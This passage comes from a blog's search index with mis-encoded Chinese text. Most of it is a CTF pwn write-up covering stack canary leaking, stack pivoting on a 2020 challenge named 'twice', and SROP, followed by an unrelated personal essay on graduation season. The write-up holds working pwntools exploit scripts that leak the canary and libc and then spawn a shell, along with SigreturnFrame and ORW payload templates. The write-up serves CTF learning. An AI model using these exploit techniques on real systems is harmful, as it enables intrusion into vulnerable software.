‡è®°ï¼Œæ­£å¥½100ä¸ªå­—ç¬¦å æ»¡buf\n\n- å½“è¾“å…¥100ä¸ªAæ—¶ï¼Œbufåˆšå¥½è¢«å æ»¡ï¼Œè¿™æ—¶0x0açš„æ¢è¡Œç¬¦è¦†ç›–æ‰äº†åå››ä½å­—èŠ‚çš„æœ€ä½ä½ï¼ˆå¦‚å›¾æ‰€ç¤ºï¼‰ï¼Œç”±äº32ä½ç¨‹åºä¸­ï¼Œcanaryä¸ºå››ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥0x0aè¦†ç›–æ‰çš„å°±æ˜¯canaryçš„æœ€ä½ä½/x00\n\n  \n\n> canaryæœ€ä½ä½0x00èµ·åˆ°æˆªæ–­å­—ç¬¦ä¸²çš„ä½œç”¨ï¼Œåœ¨æœ‰äº›å‡½æ•°å¤„ç†æ—¶ï¼Œä¼šæŠŠè¿™ä¸ªå­—ç¬¦å½“åšç»“æŸç¬¦ï¼Œå³ä¸ºäº†é˜²æ­¢printfã€putsç­‰å‡½æ•°è¯»å‡ºå®ƒçš„å€¼ï¼Œæ‰€ä»¥è¯´ï¼Œå¦‚æœcanaryçœŸçš„åªé è¿™ä¸ªæ¥é˜²å¾¡çš„è¯ï¼Œé‚£ä¹ˆåªéœ€è¦è¦†ç›–æ‰0x00ï¼Œä¾¿å¯ä»¥è¯»å–å®ƒçš„å€¼\n\n\n\n## 0x04 exp\n\n```python\n#!/usr/bin/env python\nfrom pwn import *\ncontext.binary = 'can'\n# context.log_level = 'debug'\nio = process('./canary')\nget_shell=ELF(\"./canary\").sym[\"getshell\"]\n#è·å¾—getshellçš„åœ°å€\nio.recvuntil(\"Hello Hacker!\\n\")\npayload = \"A\"*100\nio.sendline(payload)\nio.recvuntil(\"A\"*100)\nCanary = u32(io.recv(4))-0xa #ç»§ç»­æ¥æ”¶åå››ä½æ•°æ®ï¼Œå¹¶å‡æ‰0x0a\nlog.info(\"Canary:\"+hex(Canary))\npayload = b\"\\x90\"*100+p32(Canary)+b\"\\x90\"*12+p32(get_shell)\nio.send(payload)\nio.recv()\nio.interactive()\n```\n\n![image-20200701170620675](https://i.loli.net/2020/07/01/PiuQAro8GFBZ9W3.png)\n\næˆåŠŸ~\n\n------\n\n# 0x05 æ ˆè¿ç§»åŸç†\n\nä»¥32ä½ç¨‹åºä¸¾ä¾‹ï¼Œåœ¨ä½¿ç”¨`call`è¿™ä¸ªå‘½ä»¤ï¼Œè¿›å…¥ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™,ç¨‹åºä¸€èˆ¬æƒ…å†µä¸‹ä¼šè¿›è¡Œä¸‰æ­¥æ ˆæ“ä½œ:\n\n> push eip+4;\n>\n> push ebp;\n>\n> mov ebp,esp;\n\nä»¥ä¿æŠ¤ç°åœºï¼Œé¿å…æ‰§è¡Œå®Œå‡½æ•°åå †æ ˆä¸å¹³è¡¡æˆ–è€…æ‰¾ä¸åˆ°ä¹‹å‰çš„å…¥å£åœ°å€ã€‚\n\nåœ¨æ‰§è¡Œå®Œå‡½æ•°åä¹Ÿä¼šè¿›è¡Œä¸€ç³»åˆ—å¯¹åº”çš„æ“ä½œæ¥è¿˜åŸç°åœº`leave;ret;`\n\nè¿™è¾¹çš„leaveå°±ç›¸å½“äºè¿›å…¥å‡½æ•°æ ˆæ“ä½œçš„é€†è¿‡ç¨‹ã€‚\n\n>leave  == mov esp,ebp; pop ebp;\n>ret    == pop eip #å¼¹å‡ºæ ˆé¡¶æ•°æ®ç»™eipå¯„å­˜å™¨\n\n\n\nè¿™æ ·å¦‚æœèƒ½å¤Ÿæ§åˆ¶æ ˆç©ºé—´åˆ°ä»»æ„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½åˆ©ç”¨retæ¥æ§åˆ¶eipçš„æ•°æ®äº†ï¼ˆæ ˆé¡¶æ•°æ®ï¼‰\n\n## 0x06 æ ˆè¿ç§»çš„åˆ©ç”¨\n\næ ˆè¿ç§»ä¸€èˆ¬åœ¨ä»€ä¹ˆæƒ…å†µä¸‹åˆ©ç”¨å‘¢ï¼Ÿ\n\nå®ƒä¸»è¦æ˜¯ä¸ºäº†è§£å†³æ ˆæº¢å‡ºå¯ä»¥ï¼Œä½†æº¢å‡ºç©ºé—´å¤§å°ä¸è¶³çš„é—®é¢˜ï¼ˆå¦‚readå‡½æ•°çš„å­—èŠ‚é™åˆ¶ç­‰ï¼‰\n\næ‰€ä»¥æˆ‘ä»¬å°±è¦é€šè¿‡æ§åˆ¶ebpæ¥ç»•è¿‡é™åˆ¶ã€‚\n\nç”±äº`ret`è¿”å›çš„æ˜¯æ ˆé¡¶æ•°æ®ï¼Œè€Œæ ˆé¡¶åœ°å€æ˜¯ç”±espå¯„å­˜å™¨çš„å€¼å†³å®šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬æ§åˆ¶äº†\n\nespå¯„å­˜å™¨çš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå°±èƒ½å¤Ÿæ§åˆ¶retè¿”å›çš„æ ˆé¡¶æ•°æ®ã€‚\n\nç°åœ¨æˆ‘ä»¬å·²ç»çŸ¥é“äº† leave èƒ½å¤Ÿå°†ebpå¯„å­˜å™¨çš„æ•°æ®movåˆ°espå¯„å­˜å™¨ä¸­ï¼Œç„¶è€Œï¼Œä¸€å¼€å§‹ebpå¯„å­˜\n\nå™¨ä¸­çš„å€¼å¹¶ä¸æ˜¯ç”±æˆ‘ä»¬æ¥å†³å®šçš„ï¼Œé‡ç‚¹æ˜¯æ¥ä¸‹æ¥çš„é‚£ä¸ª`pop ebp`çš„æ“ä½œï¼Œè¯¥æ“ä½œå°†æ ˆä¸­ä¿å­˜çš„ebp\n\næ•°æ®èµ‹å€¼ç»™äº†ebpå¯„å­˜å™¨ï¼Œè€Œæˆ‘ä»¬æ­£å¥½èƒ½å¤Ÿæ§åˆ¶è¯¥éƒ¨åˆ†æ•°æ®ã€‚æ‰€ä»¥åˆ©ç”¨æ€è·¯ä¾¿æˆç«‹äº†ã€‚\n\næˆ‘ä»¬é¦–å…ˆå°†æ ˆä¸­ä¿å­˜ebpæ•°æ®çš„åœ°å€ç©ºé—´æ§åˆ¶ä¸ºæˆ‘ä»¬æƒ³è¦æ ˆé¡¶åœ°å€ï¼Œå†åˆ©ç”¨ä¸¤æ¬¡`leave`æ“ä½œ`mov `\n\n`esp,ebp;pop ebp;mov esp,ebp;pop ebp;`å°†espå¯„å­˜å™¨ä¸­çš„å€¼å˜æˆæˆ‘ä»¬æƒ³è®©å®ƒæˆä¸ºçš„å€¼ã€‚ç”±\n\näºæœ€åè¿˜æœ‰ä¸€ä¸ª`pop ebp`æ“ä½œå¤šä½™ï¼Œè¯¥æ“ä½œå°†å¯¼è‡´`esp-4`ï¼Œæ‰€ä»¥åœ¨æ„é€ retçš„æ•°æ®æ—¶åº”å½“è€ƒè™‘åˆ°å°†\n\næ•°æ®æ”¾åˆ°æˆ‘ä»¬æ„é€ çš„espåœ°å€-4çš„ä½ç½®ã€‚ï¼ˆå³æ ˆé¡¶ç•™4ä½/8ä½ç»™ebp/rbpï¼‰\n\n------\n\n## 0x07 2020ç¬¬äº”ç©ºé—´ twice\n\næ‹¿2020ç¬¬äº”ç©ºé—´çš„ä¸€é“pwné¢˜è¯´ä¸€ä¸‹\n\nåªå­˜åœ¨canaryä¿æŠ¤ï¼Œæ‹–å…¥IDA\n\nä¸»å‡½æ•°æ˜¯è¿™æ ·çš„\n\n![image-20200716122318894](https://i.loli.net/2020/07/16/mJDaQHuXNKwbv3z.png)\n\nè·Ÿè¿›`sub_4007A9`å‡½æ•°\n\n![image-20200716122231147](https://i.loli.net/2020/07/16/lfrT6CLRhGMuKSt.png)\n\nå…¶å®å¯ä»¥çœ‹å‡ºæ¥ï¼Œä¸»å‡½æ•°åˆå§‹åŒ–ncountä¸º0ï¼Œä¸ºçš„æ˜¯å°†4007A9å¾ªç¯ä¸¤æ¬¡\n\næŸ¥çœ‹æ ˆæƒ…å†µ\n\n![image-20200716122755224](https://i.loli.net/2020/07/16/d5gVkCaqOGmrlYA.png)\n\nè¾“å…¥çš„sä¹‹å88ä½å°±æ˜¯v6ï¼Œå³canary\n\nå†çœ‹v3ï¼Œè·Ÿè¿›40076D\n\n![image-20200716123046878](https://i.loli.net/2020/07/16/OBTfVRevcmMw1NH.png)\n\nç»“åˆreadå‡½æ•°ï¼Œç¬¬ä¸€æ¬¡å¯ä»¥è¾“å…¥89ä¸ªå­—ç¬¦ï¼Œæ°å¥½å¯ä»¥è¦†ç›–åˆ°canaryæœ€ä½ä½ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡ç”¨æ¥æ³„éœ²canaryå’Œrbp\n\nç¬¬äºŒæ¬¡å¯ä»¥è¾“å…¥112ä¸ªå­—ç¬¦ï¼Œå…ˆç®—ä¸€ä¸‹ï¼Œ88+8(canary)+8(saved rbp)+8(return addr)=112\n\næ˜¾ç„¶é•¿åº¦ä¸å¤Ÿï¼Œå› æ­¤ç¬¬äºŒæ¬¡è¾“å…¥æ¥æ„é€ æ ˆè¿ç§»\n\nå¯ä»¥å°†æ–°æ ˆæ”¾åœ¨å‡½æ•°åˆšè¾“å…¥çš„ä½ç½®\n\ngdbå…ˆè°ƒè¯•ä¸€ä¸‹\n\n![image-20200716121859353](https://i.loli.net/2020/07/16/m9x6IMgld3wtPnz.png)\n\nè®¡ç®—å‡ºæ—§rbpä¸è¾“å…¥ä½ç½®å·®0x70ï¼Œå› æ­¤æ–°rbp=leak_rbp-0x70\n\nå› æ­¤é€šè¿‡ä¸¤æ¬¡leaveå°±å¯ä»¥å®Œæˆæ–°rbpçš„è¿ç§»\n\n## 0x08 exp\n\nå†™äº†æŒºä¹…çš„...\n\nä¸»è¦æ˜¯è€ƒè¯•ä¹‹å‰è¯•è¿‡èƒ½è·‘çš„è„šæœ¬ç°åœ¨ä¸è¡Œäº†ï¼Œlibcseacheræœä¸åˆ°2.23çš„ç‰ˆæœ¬ï¼Œä¸æ˜åŸå› ï¼Œä¼—æ‰€å‘¨çŸ¥pwnæ˜¯é—¨ç„å­¦ï¼Œæ²¡åŠæ³•Ubuntu16çš„æœ¬åœ°åº“åšçš„\n\n```python\nfrom pwn import *\ncontext.log_level=\"debug\"\ncontext.arch='amd64'\nelf=ELF('./pwn1')\nsh=process('./pwn1')\nlibc = ELF(\"libc-2.23.so\") \n#æœ¬åœ°ï¼Œubuntu16.4\n#sh=remote(\"121.36.59.116\",9999)\n\nleave_ret=0x0400879     #leaveçš„åœ°å€\npop_rdi=0x0400923\nputs_plt=elf.plt['puts']\nputs_got=elf.got['puts']\n\nsh.recvuntil(\">\")\nsh.send('a'*89)\nsh.recvuntil(\"a\"*89)\ncannay=u64(sh.recv(7).rjust(8,\"\\x00\"))       #æœ€åä¸€ä½ç”¨\\x00è¦†ç›–å›å»\nstack_addr=u64(sh.recv(6).ljust(8,\"\\x00\"))-0x70  #æ—§rbp -0x70\n\nprint \"cannry: \"+hex(cannay)\nprint \"stack_addr: \"+hex(stack_addr)\nsh.recvuntil(\">\")\npayload=flat([stack_addr+0x60,pop_rdi,puts_got,puts_plt,0x0400630]) \n#flatæ¨¡å—èƒ½å°†patternå­—ç¬¦ä¸²å’Œåœ°å€ç»“åˆå¹¶ä¸”è½¬ä¸ºå­—èŠ‚æ¨¡å¼ï¼Œ\n#è¿”å›åœ°å€0x400630æ˜¯startå‡½æ•°ï¼Œæˆ–è€…å¯ä»¥ç”¨mainå‡½æ•°åœ°å€\npayload+='a'*48+p64(cannay)+p64(stack_addr)+p64(leave_ret)\n#æ„é€ æ ˆè¿ç§»\nsh.send(payload)\nsh.recvuntil(\"\\n\")\nputs_addr=u64(sh.recv(6).ljust(8,\"\\x00\"))\nprint \"puts_addr: \"+hex(puts_addr)\n\n#leak libc \nlibc_base=puts_addr-libc.sym['puts']\nsystem_addr=libc_base+libc.sym['system']\nprint \"system_addr:\"+hex(system_addr)\nbinsh_a =libc_base + 0x18ce17#\"/bin/sh\"çš„åç§»åœ°å€\n#leak again \nsh.recvuntil(\">\")\nsh.send('a'*89)\nsh.recvuntil(\"a\"*89)\ncannay=u64(sh.recv(7).rjust(8,\"\\x00\"))\nstack_addr=u64(sh.recv(6).ljust(8,\"\\x00\"))-0x70 \n\nprint \"cannry: \"+hex(cannay)\nprint \"stack_addr: \"+hex(stack_addr)\nsh.recvuntil(\">\")\npayload=flat([stack_addr+0x60,pop_rdi,binsh_a,system_addr,0x0400630])\npayload+='a'*48+p64(cannay)+p64(stack_addr)+p64(leave_ret)\nsh.send(payload)\n\nsh.interactive()\n\n```\n\nä¸»è¦æ€è·¯æ˜¯åˆ©ç”¨ç¬¬ä¸€æ¬¡readæ³„éœ²canaryå’Œæ—§rbp\n\nç¬¬äºŒæ¬¡readæ„é€ æ ˆè¿ç§»ï¼Œæœ¬æ¥æƒ³å¤šå†™ç‚¹çš„ï¼Œä½†æ˜¯æ‹¿èµ·é¢˜çœŸçš„ä¸çŸ¥é“è¯¥å’‹å†™äº†\n\nç¬¬ä¸€æ¬¡çœ‹ç¡®å®ä¸å¥½ç†è§£ï¼Œè¿˜æ˜¯è¦ç»“åˆå‰é¢æ ˆè¿ç§»çš„åŸç†ï¼Œè‡ªå·±åŠ¨æ‰‹åšä¸€ä¸‹\n\nè¯è¯´å¼ è€å¸ˆå·²ç»å¼€å§‹è®©æˆ‘å†™å †äº†ï¼Œæˆ‘å´è¿˜åœ¨æ ˆä¸Šçº ç»“..\n\n# 0x09 SROP\n\n[SROP](https://www.yuque.com/hxfqg9/bin/erh0l7#cS7rH)\n\nSROP(Sigreturn Oriented Programming) ï¼Œå…¶ä¸­ï¼Œ`sigreturn`æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨ç±» unix ç³»ç»Ÿå‘ç”Ÿ signal çš„æ—¶å€™ä¼šè¢«é—´æ¥åœ°è°ƒç”¨ã€‚å½“ç³»ç»Ÿè¿›ç¨‹å‘èµ·ï¼ˆdeliverï¼‰ä¸€ä¸ª signal çš„æ—¶å€™ï¼Œè¯¥è¿›ç¨‹ä¼šè¢«çŸ­æš‚çš„æŒ‚èµ·ï¼ˆsuspendï¼‰ï¼Œè¿›å…¥å†…æ ¸â‘ ï¼Œç„¶åå†…æ ¸å¯¹è¯¥è¿›ç¨‹ä¿ç•™ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œè·³è½¬åˆ°ä¹‹å‰æ³¨å†Œå¥½çš„ signal handler ä¸­å¤„ç† signalâ‘¡ï¼Œå½“ signal è¿”å›åâ‘¢ï¼Œå†…æ ¸ä¸ºè¿›ç¨‹æ¢å¤ä¹‹å‰ä¿ç•™çš„ä¸Šä¸‹æ–‡ï¼Œæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œâ‘£\n\n![Process of Signal Handlering](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/ProcessOfSignalHandlering.png)\n\nå†…æ ¸ä¸ºè¿›ç¨‹ä¿ç•™ç›¸åº”çš„ä¸Šä¸‹æ–‡çš„æ–¹æ³•ä¸»è¦æ˜¯ï¼š**å°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼Œä»¥åŠå‹å…¥ signal ä¿¡æ¯ï¼Œä»¥åŠæŒ‡å‘ sigreturn çš„ç³»ç»Ÿè°ƒç”¨åœ°å€**ï¼Œæ­¤æ—¶æ ˆçš„æƒ…å†µæ˜¯è¿™æ ·çš„ï¼š\n\n![signal2-stack](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/signal2-stack.png)\n\næˆ‘ä»¬**ç§° ucontext ä»¥åŠ siginfo è¿™ä¸€æ®µä¸º signal frame**ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸€éƒ¨åˆ†æ˜¯åœ¨ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œä¹‹åä¼šè·³è½¬åˆ°æ³¨å†Œè¿‡ signal handler ä¸­å¤„ç†ç›¸åº”çš„ signalï¼Œå› æ­¤ï¼Œå½“ signal handler æ‰§è¡Œå®Œæˆåå°±ä¼š**æ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨æ¥æ¢å¤ä¸Šä¸‹æ–‡ï¼Œä¸»è¦æ˜¯å°†ä¹‹å‰å‹å…¥çš„å¯„å­˜å™¨çš„å†…å®¹ç»™è¿˜åŸå›å¯¹åº”çš„å¯„å­˜å™¨**ï¼Œç„¶åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œ\n\n32 ä½çš„ sigreturn çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 77ï¼Œ64 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15\n\nå‡è®¾æ”»å‡»è€…å¯ä»¥æ§åˆ¶ç”¨æˆ·è¿›ç¨‹çš„æ ˆï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥ä¼ªé€ ä¸€ä¸ª Signal Frameï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™é‡Œä»¥ 64 ä½ä¸ºä¾‹å­ï¼Œç»™å‡º Signal Frame æ›´åŠ è¯¦ç»†çš„ä¿¡æ¯\n\n![signal2-stack](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/srop-example-1.png)\n\nå½“ç³»ç»Ÿæ‰§è¡Œå®Œ sigreturn ç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œä¼šæ‰§è¡Œä¸€ç³»åˆ—çš„ pop æŒ‡ä»¤ä»¥ä¾¿äºæ¢å¤ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œå½“æ‰§è¡Œåˆ° rip æ—¶ï¼Œå°±ä¼šå°†ç¨‹åºæ‰§è¡ŒæµæŒ‡å‘ syscall åœ°å€ï¼Œæ ¹æ®ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œæ­¤æ—¶ï¼Œä¾¿ä¼šå¾—åˆ°ä¸€ä¸ª shellã€‚\n\næœ‰æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¸Œæœ›æ‰§è¡Œä¸€ç³»åˆ—çš„å‡½æ•°ã€‚æˆ‘ä»¬åªéœ€è¦åšä¸¤å¤„ä¿®æ”¹å³å¯\n\n- **æ§åˆ¶æ ˆæŒ‡é’ˆã€‚**\n- **æŠŠåŸæ¥ rip æŒ‡å‘çš„`syscall` gadget æ¢æˆ`syscall; ret` gadgetã€‚**\n\nå¦‚ä¸‹å›¾æ‰€ç¤º ï¼Œè¿™æ ·å½“æ¯æ¬¡ syscall è¿”å›çš„æ—¶å€™ï¼Œæ ˆæŒ‡é’ˆéƒ½ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ª Signal Frameã€‚å› æ­¤å°±å¯ä»¥æ‰§è¡Œä¸€ç³»åˆ—çš„ sigreturn å‡½æ•°è°ƒç”¨ã€‚\n\n![signal2-stack](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/srop-example-2.png)\n\nrax = 15ï¼Œæ‰§è¡Œsyscallï¼Œä¾¿å¯å°†sigframeçš„å€¼æ¢å¤ã€‚\n\næ¨¡æ¿ï¼š\n\n```python\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_execve\nsigframe.rdi = stack_addr + 0x120  # \"/bin/sh\" 's addr\nsigframe.rsi = 0x0\nsigframe.rdx = 0x0\nsigframe.rsp = stack_addr\nsigframe.rip = syscall_ret\npayload = p64(start_addr) + p64(syscall_ret) + str(sigframe)\n```\n\n![image-20230526212409044](https://files.catbox.moe/fkrp1r.png)\n\nsetcontext+53 + orwçš„åˆ©ç”¨ï¼Œorwæ¨¡æ¿\n\n```python\norw  = p64(pop_rdi) + p64(FLAG)\norw += p64(pop_rsi) + p64(0)\norw += p64(pop_rax) + p64(2)\norw += p64(syscall)\norw += p64(pop_rdi) + p64(3)\norw += p64(pop_rsi) + p64(heap_base + 0x3000)\norw += p64(pop_rdx) + p64(0x31)\norw += p64(read)\norw += p64(pop_rdi) + p64(1)\norw += p64(write)\n```\n\n","tags":["KNOWLEDGE","stack"],"categories":["LEARNING"]},{"title":"è§‚æ¯•ä¸šå­£æœ‰æ„Ÿ","url":"/2020/06/20/Graduation/","content":"\n------\n\n\n\nå¦‚æœæœ‰ä¸€ç¾¤äººåœ¨ä½ ç”Ÿå‘½çš„æŸä¸€æ—¶é—´çªç„¶é—¯è¿›ä½ çš„ç”Ÿæ´»ï¼Œç›¸å¤„å››å¹´ä¹‹ååˆæ‚„ç„¶ç¦»å¼€\n\nå¦‚æœæœ‰ä¸ªåœ°æ–¹ä»»å‡­ä½ æŒ¥æ´’é’æ˜¥ï¼Œå¤šå¹´åå´åªèƒ½ç•™åœ¨ä½ çš„å›å¿†ä¹‹ä¸­\n\nä¼šæ˜¯ä»€ä¹ˆæ„Ÿå—ï¼Ÿ\n\nå®¿èˆæ¥¼æŒ‚èµ·æ°”çƒï¼Œç”»ä¸Šæ¿æŠ¥ï¼Œæ¬¢é€æ¯•ä¸šç”Ÿ\n\né€€åŠå®¿èˆç‚¹ï¼Œæ—§ä¹¦å›æ”¶ç‚¹ï¼Œè¡Œææ‰˜è¿ç‚¹ï¼Œå…¨å¥—æœåŠ¡ï¼Œä¸è¯·è‡ªæ¥\n\nä¸€å¹´ä¸€åº¦çš„æ¯•ä¸šå­£åˆåˆ°äº†ã€‚\n\næ¯å¹´è¿™ä¸ªæ—¶å€™éƒ½é¢‡æœ‰æ„Ÿè§¦ï¼Œä»Šå¹´ä¹Ÿæ˜¯ï¼Œ\n\næ ¡å›­é‡Œå¤šäº†è®¸å¤šæ‹–ç€è¡Œæç®±çš„äººï¼Œä»–ä»¬çš„å†…å¿ƒä»€ä¹ˆæ„Ÿå—ï¼Œèµ°åœ¨è·¯ä¸Šå®åœ¨éš¾ä»¥æ£æµ‹\n\nå¤§å­¦å››å¹´èµ°åˆ°ç»ˆç‚¹ï¼Œæˆ–è®¸åº”è¯¥åƒç”µå½±é‡Œåƒä¹¦é‡Œåƒæ­Œé‡Œé‚£æ ·ä¸€èµ·ç¼…æ€€é€å»çš„é’æ˜¥\n\nä¹Ÿæˆ–è®¸å¿™ç€è®ºæ–‡å¿™ç€ç­”è¾©å¿™ç€å¤è¯•å¿™ç€æ‰¾å·¥ä½œè€ŒåŒ†åŒ†ä¸€é¡¿é¥­å°±è¯´äº†å†è§\n\nä»–ä»¬è„¸ä¸Šä¼¼ä¹æµéœ²ç€è½»æ¾å’Œé‡Šç„¶ï¼Œå´åˆæœ‰äº›ä¼¤æ„Ÿ\n\næˆ–è€…æ„Ÿæ…¨ä¸‡åƒè€Œè¡¨ç°å¾—å¾ˆå¹³æ·¡ï¼Œæˆ‘ä¸å¥½è¯´\n\nå›¾ä¹¦é¦†ã€é•œæ¹–å‘¨å›´ï¼Œå¤šäº†è®¸å¤šæ‹æ¯•ä¸šç…§çš„äºº\n\nä»–ä»¬ç©¿ç€è¿™è¾ˆå­å”¯ä¸€ä¸€æ¬¡ä¹Ÿå¯èƒ½æ˜¯æœ€åä¸€æ¬¡çš„æ¯•ä¸šæœ\n\nèº«è¾¹ç«™ç€è¿™è¾ˆå­å¯èƒ½å†ä¹Ÿè§ä¸åˆ°çš„åŒå­¦\n\nè„šä¸‹è¸©ç€è¿™è¾ˆå­å¯èƒ½å†ä¹Ÿå›ä¸æ¥çš„æ¯æ ¡\n\nè„¸ä¸Šæ´‹æº¢ç€è¿™è¾ˆå­å¯èƒ½æœ€ç™¾æ„Ÿäº¤é›†çš„ç¬‘å®¹\n\nå¸½å­æ‰”åˆ°å¤©ç©ºçš„ä¸€ç¬é—´ï¼Œä¹Ÿæ„å‘³ç€ï¼ŒçœŸåˆ°äº†è¯´å†è§çš„æ—¶å€™\n\næ˜¨å¤©å’Œèˆå‹åç€å°é»„è½¦å»å­¦é™¢æ¥¼ä¸Šè¯¾ï¼Œèº«æ—åç€ä¸€ä½æ¯•ä¸šç”Ÿï¼Œä»–å’Œå¸æœºä¸€ç›´åœ¨äº¤è°ˆ\n\nâ€œæœ€åä¸€æ¬¡åå­¦æ ¡çš„å°é»„äº†ï¼Œå¸ˆå‚…ï¼Œä¸œé—¨â€\n\nâ€œå¸¦ä½ ç»•ä¸€åœˆå§ï¼Œé¡ºä¾¿å†çœ‹çœ‹å­¦æ ¡çš„é£æ™¯â€\n\nè·¯ç¨‹ä¸è¿œï¼Œä½†èŠäº†å¾ˆå¤šã€‚\n\næ™šä¸Šè€ƒå®Œè¯•å›æ¥ï¼Œè·¯ç»äºŒé£Ÿå ‚å¬åˆ°æœ‰äººåœ¨å”±æ­Œï¼Œ\n\nå°é˜¶ä¸‹ä¸‰äººæŠ±ç€å‰ä»–è½»å”±ï¼Œæ­Œå¾ˆæ…¢ï¼Œå¾ˆæŸ”ï¼Œå¾ˆå¥½å¬\n\nå°é˜¶ä¸Šåå¾—æ»¡æ»¡çš„äººï¼Œæˆ‘çŸ¥é“éƒ½æ˜¯æ¯•ä¸šç”Ÿï¼Œä»–ä»¬ä¸‰äº”æˆç¾¤é åœ¨ä¸€èµ·ï¼Œæœ‰æœ‹å‹ï¼Œæœ‰æƒ…ä¾£ï¼Œæœ‰åƒæˆ‘ä¸€æ ·çš„å›´è§‚è€…\n\næœ‰çš„è°ˆç¬‘é£ç”Ÿï¼Œæœ‰çš„æ‹ç…§ç•™å¿µï¼Œæœ‰çš„é™·å…¥æ·±æ€ï¼Œæœ‰çš„ä½å£°æŠ½æ³£ï¼Œ\n\nå†å¾€å‰èµ°ï¼Œå¾ˆå¤šäººèšåœ¨ä¸€èµ·å‘Šåˆ«ï¼Œå¤§å®¶è¯­æ°”éƒ½å¾ˆå¿«ä¹ï¼Œåƒæ˜¯å›¢å»ºè¿‡åï¼Œç¬¬äºŒå¤©è¿˜ä¼šå†ç›¸è§ã€‚\n\nåŒè¡Œå››å¹´ï¼ŒåŒå­¦ä¸€åœºï¼Œå¤©å„ä¸€æ–¹ï¼Œçš†æ˜¯æ€§æƒ…ä¸­äººï¼Œä¸ºç¦»åˆ«è€Œæ„Ÿä¼¤ï¼Œç†æ‰€å½“ç„¶\n\nè‡³äºæœ‰äººè¯´å¤ªåªšä¿—ï¼Œé“ä¸åŒï¼Œä½ å¯èƒ½æ— æ³•ç†è§£\n\næ¯•ä¸šå­£åƒæ˜¯ä¸€ç¯‡è¯—æ­Œçš„ç»ˆç« ï¼Œåˆæ˜¯å¦ä¸€ç¯‡æ–‡ç« çš„åºç« \n\nå½“ä½ ç¦»å¼€æ ¡é—¨çš„é‚£ä¸€åˆ»ï¼Œå°±æ„å‘³ç€ä½ è¦å’Œè¿‡å»åšä¸ªäº†æ–­ï¼Œå’Œé‚£äº›æœ‹å‹ä»¬åšä¸ªå‘Šåˆ«\n\nè½¬çœ¼æˆ‘ä¹Ÿæ­¥å…¥å¤§ä¸‰ï¼Œæˆ‘å®åœ¨éš¾ä»¥æƒ³åƒæˆ‘æ¯•ä¸šæ—¶ä¼šæ˜¯ä»€ä¹ˆæ„Ÿå—\n\nå¯èƒ½å†ä¹Ÿåƒä¸åˆ°å¤©å¤©åæ§½çš„é£Ÿå ‚å¤§å¦ˆçš„é¥­èœ\n\næƒ³æ‰“çƒå†ä¹Ÿæ‰¾ä¸åˆ°éšå«éšåˆ°çš„å…„å¼Ÿ\n\nä¸Šç½‘ä¹°ä¸œè¥¿æ·˜å®æ”¶è´§åœ°å€å†ä¹Ÿä¸èƒ½å¡«å­¦æ ¡\n\næœ€é‡è¦çš„æ˜¯é‚£äº›é™ªä½ èµ°è¿‡é’æ˜¥çš„äºº\n\né‚£äº›ä½ æ›¾ä»¥ä¸ºæ— æ¯”é‡è¦çš„äººç”ŸèŠ‚ç‚¹\n\né‚£äº›ä½ ä»¥ä¸ºä¸å¯æˆ–ç¼ºçš„äºº\n\nå½“çœŸåˆ°äº†è¦è¯´å†è§çš„æ—¶å€™\n\næˆ‘ä¼šæ˜¯ä»€ä¹ˆæ„Ÿå—ï¼Ÿ\n\n\n\n\n\n> å¤•é˜³ä¸‹çš„èŠ±å¾„ã€‚\n>\n> æˆ‘åŒæœ‹å‹æŒ¥æ‰‹å‘Šåˆ«ï¼Œå‘å‰èµ°å»ã€‚\n>\n> ä¸¤ä¸ªåŒå­¦åœ¨å‰é¢èµ°ç€ã€‚\n>\n> å…«é‡æ¨±èŠ±è½äº†ä¸€åœ°ã€‚\n>\n> å†æŠ¬å¤´ï¼Œèµ°åœ¨å‰é¢çš„åŒå­¦æ¶ˆå¤±åœ¨äº†é£é‡Œã€‚\n>\n> ç”µçº¿æ†ä¸Šçš„é£é¸ŸæƒŠèµ·ï¼Œå‘è¿œæ–¹é£å»ã€‚\n>\n> æˆ‘å†ä¹Ÿæ²¡æœ‰è§è¿‡é‚£åªé£é¸Ÿã€‚\n\n\n\n<img src=\"https://i.loli.net/2020/06/21/FNHuRqDbTyWIa3L.png\" alt=\"image-20200621000130902\" style=\"zoom: 33%;\" />","tags":["PERSONALITY"],"categories":["LIFE"]},{"title":"å­¦ä¹ PLTè¡¨GOTè¡¨","url":"/2020/06/16/GOTPLT/","content":"\n# 